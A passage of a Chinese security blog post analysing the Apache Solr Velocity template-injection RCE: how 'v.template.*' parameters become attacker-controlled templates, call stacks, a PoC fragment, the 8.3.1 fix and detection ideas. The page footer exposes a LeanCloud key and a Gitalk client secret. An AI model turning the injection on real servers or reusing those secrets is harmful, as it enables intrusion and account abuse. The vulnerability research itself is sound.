+<p>先看第一个if——<code>SolrParamResourceLoader(request)</code>这个构造函数，其会将请求中的<code>v.template</code>开头的参数名截取剩下的部分+“.vm”作为key——注意到PoC中的<code>v.template.custom=%23set($x=%27%27)...</code>，截取后得到<code>custom</code>+<code>.vm</code>=<code>custom.vm</code>，而请求中参数内容作为template，因此由于这个而参数时攻击者可以控制的——例如在PoC中，将内容设置为了<code>%23set($x=%27%27)...</code>，因此造成SSTI：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124211628918.png" alt="image-20191124211628918"></p>
+<p>再看第二个if——<code>SolrVelocityResourceLoader()</code>其任务是加载一个有velocity classpath的ResourceLoader：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124212157913.png" alt="image-20191124212157913"></p>
+<h3 id="VelocityResponseWriter-getTemplate"><a href="#VelocityResponseWriter-getTemplate" class="headerlink" title="VelocityResponseWriter#getTemplate"></a>VelocityResponseWriter#getTemplate</h3><p>回到VelocityResponseWriter#write，在VelocityResponseWriter#getTemplate时，会从请求v.template参数中获取模板的名称，即PoC中的<code>v.template=custom</code>，再走到<code>engine.getTemplate(templateName + TEMPLATE_EXTENSION)</code>获取template，即前面设置的<code>custom.vm</code>：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124205548129.png" alt="image-20191124205548129"></p>
+<p>模板解释发生在<code>org.apache.velocity.Template#merge(Context, Writer)</code>，后面就是Velocity模板解释逻辑了，不再跟。</p>
+<p>总结一下调用栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">doFilter:<span class="number">343</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">397</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">call:<span class="number">558</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">writeResponse:<span class="number">849</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">  writeQueryResponse:<span class="number">65</span>, QueryResponseWriterUtil (org.apache.solr.response)</span><br><span class="line">    write:<span class="number">150</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      createEngine:<span class="number">313</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">        SolrParamResourceLoader()<span class="comment">//设置params.resource.loader——custom.vm模板</span></span><br><span class="line">      createEngine:<span class="number">324</span>, VelocityResponseWriter (org.apache.solr.response) <span class="comment">//设置solr.resource.loader——加载velocity lib</span></span><br><span class="line">    write:<span class="number">152</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      getTemplate:<span class="number">372</span>, VelocityResponseWriter (org.apache.solr.response) <span class="comment">// 获取模板</span></span><br><span class="line">    write:<span class="number">166</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      merge:<span class="number">264</span>, Template (org.apache.velocity) <span class="comment">// 模板渲染，RCE</span></span><br><span class="line">        merge:<span class="number">359</span>, Template (org.apache.velocity)</span><br><span class="line">          render:<span class="number">376</span>, SimpleNode (org.apache.velocity.runtime.parser.node)</span><br></pre></td></tr></table></figure>
+<h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h1><p>下载v8.3.1的solr，发送PoC后可以看到报错了：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208165035876.png" alt="image-20191208165035876"></p>
+<p>从报错内容上看，solr没获取到custom.vm模板，那再参考之前分析，应该是VelocityResponseWriter#createEngine做了修改，但是调试后发现这里并没修改，只是两个if判断都为false了，paramsResourceLoaderEnabled和solrResourceLoaderEnabled都是false：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208172313550.png" alt="image-20191208172313550"></p>
+<p>经过调试，可以找到VelocityResponseWriter的构造调用栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">init:<span class="number">110</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">initInstance:<span class="number">104</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">createInst:<span class="number">443</span>, PluginBag$LazyPluginHolder (org.apache.solr.core)</span><br><span class="line">get:<span class="number">415</span>, PluginBag$LazyPluginHolder (org.apache.solr.core)</span><br><span class="line">get:<span class="number">168</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">get:<span class="number">178</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">getQueryResponseWriter:<span class="number">2753</span>, SolrCore (org.apache.solr.core)</span><br><span class="line">getResponseWriter:<span class="number">788</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">call:<span class="number">556</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">397</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">343</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br></pre></td></tr></table></figure>
+<p>在init()中可以看到enabled的值取决于<code>PARAMS_RESOURCE_LOADER_ENABLED</code>和<code>SOLR_RESOURCE_LOADER_ENABLED</code>，注意这里的获取方式：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208200421304.png" alt="image-20191208200421304"></p>
+<p>对比下面的v8.3.1版本：</p>
+<p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208194710665.png" alt="image-20191208194710665"></p>
+<p><code>Boolean.getBoolean()</code>是从系统变量里面拿参数，所以PoC的第一个包（0x01步）的设置没有用。即官方修复方案选择在PoC的第一步修复，即加载配置不从solr中加载而是从系统配置中加载，以此导致第二步中的模板不可控，PoC失效。</p>
+<h1 id="检测方式"><a href="#检测方式" class="headerlink" title="检测方式"></a>检测方式</h1><p>因为涉及的变量和条件太多了，感觉白盒即使用污点传播也很难发现bug，另外，如果要用污点传播，最好能加上反向传播，这样才能识别官方的修复方案。</p>
+<p>黑盒检测的话就看包发的那几个变量就可以了。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>又补上了一个史前的坑，这次solr的漏洞出发过程比较复杂，导致白盒很难检测，日后可以思考如何解决这一类漏洞。</p>
+<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul>
+<li>漏洞分析 - Apache Solr 模版注入漏洞(RCE) ，<a href="https://xz.aliyun.com/t/6700" target="_blank" rel="noopener">https://xz.aliyun.com/t/6700</a> </li>
+<li>详细分析Solr的CVE-2019-0193以及velocity模板注入新洞， <a href="https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ</a></li>
+<li>Raw Poc，<a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a> </li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Anemone</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://anemone.top/vulnresearch-Solr_Velocity_injection/" title="Solr Velocity模板注入漏洞分析">http://anemone.top/vulnresearch-Solr_Velocity_injection/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
+            
+              <a href="/tags/Solr/" rel="tag"># Solr</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/ml-RNN学习笔记/" rel="next" title="RNN学习笔记">
+                  <i class="fa fa-chevron-left"></i> RNN学习笔记
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/vulnresearch-Solr_DataImportHandler_RCE/" rel="prev" title="Solr DataImportHandler RCE(CVE-2019-0193)漏洞分析">
+                  Solr DataImportHandler RCE(CVE-2019-0193)漏洞分析 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复现"><span class="nav-number">2.</span> <span class="nav-text">复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-检查core是否允许velocity"><span class="nav-number">2.1.</span> <span class="nav-text">0x00  检查core是否允许velocity</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-设置params-resource-loader-enabled-true"><span class="nav-number">2.2.</span> <span class="nav-text">0x01 设置params.resource.loader.enabled=true</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-通过Velocity模板注入进行RCE"><span class="nav-number">2.3.</span> <span class="nav-text">0x02 通过Velocity模板注入进行RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Velocity-RCE方法"><span class="nav-number">2.3.1.</span> <span class="nav-text">Velocity RCE方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#影响范围"><span class="nav-number">3.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#solr-core-config"><span class="nav-number">4.1.</span> <span class="nav-text">/solr/{core}/config</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#solr-core-select"><span class="nav-number">4.2.</span> <span class="nav-text">/solr/{core}/select</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#VelocityResponseWriter-createEngine"><span class="nav-number">4.2.1.</span> <span class="nav-text">VelocityResponseWriter#createEngine</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VelocityResponseWriter-getTemplate"><span class="nav-number">4.2.2.</span> <span class="nav-text">VelocityResponseWriter#getTemplate</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#修复方式"><span class="nav-number">5.</span> <span class="nav-text">修复方式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#检测方式"><span class="nav-number">6.</span> <span class="nav-text">检测方式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#相关链接"><span class="nav-number">8.</span> <span class="nav-text">相关链接</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.jpg"
+      alt="Anemone">
+  <p class="site-author-name" itemprop="name">Anemone</p>
+  <div class="site-description" itemprop="description">关注Web安全、移动安全、Fuzz测试和机器学习</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">70</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/anemone95" title="GitHub &rarr; https://github.com/anemone95" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:anemone95@qq.com" title="E-Mail &rarr; mailto:anemone95@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">anemone</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+  
+  <script>
+  function leancloudSelector(url) {
+    return document.getElementById(url).querySelector('.leancloud-visitors-count');
+  }
+  if (CONFIG.page.isPost) {
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = visitors.getAttribute('id').trim();
+      var title = visitors.getAttribute('data-flag-title').trim();
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .then(response => response.json())
+              .then(() => {
+                leancloudSelector(url).innerText = counter.time + 1;
+              })
+            
+              .catch(error => {
+                console.log('Failed to save visitor count', error);
+              })
+          } else {
+              Counter('post', '/classes/Counter', { title: title, url: url, time: 1 })
+                .then(response => response.json())
+                .then(() => {
+                  leancloudSelector(url).innerText = 1;
+                })
+                .catch(error => {
+                  console.log('Failed to create', error);
+                });
+            
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  } else {
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return element.getAttribute('id').trim();
+      });
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length === 0) {
+            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
+              element.innerText = 0;
+            });
+            return;
+          }
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.url;
+            var time = item.time;
+            leancloudSelector(url).innerText = time;
+          }
+          for (var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = leancloudSelector(url);
+            if (element.innerText == '') {
+              element.innerText = 0;
+            }
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  }
+
+  fetch('https://app-router.leancloud.cn/2/route?appId=o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz')
+    .then(response => response.json())
+    .then(({ api_server }) => {
+      var Counter = (method, url, data) => {
+        return fetch(`https://${api_server}/1.1${url}`, {
+          method: method,
+          headers: {
+            'X-LC-Id': 'o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz',
+            'X-LC-Key': 'c6IN1PuMV3QPltJcrHfn74Gt',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        const localhost = /http:\/\/(localhost|127.0.0.1|0.0.0.0)/;
+        if (localhost.test(document.URL)) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.1.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css">
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.js"></script><script src="/js/algolia-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme: 'forest',
+      logLevel: 3,
+      flowchart: { curve: 'linear' },
+      gantt: { axisFormat: '%m/%d/%Y' },
+      sequence: { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: 'f3075553d7b0225df6ca',
+      clientSecret: '68362ba87c4cc8e13103afcf729f5bd8ea176a78',
+      repo: 'anemone95.github.io',
+      owner: 'Anemone95',
+      admin: ['Anemone95'],
+      id: '4df27488021db8ca6ff3107750d00783',
+        language: window.navigator.language || window.navigator.userLanguage,
+      
+      distractionFreeMode: 'true'
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+</script>
+
+</body>
+</html>
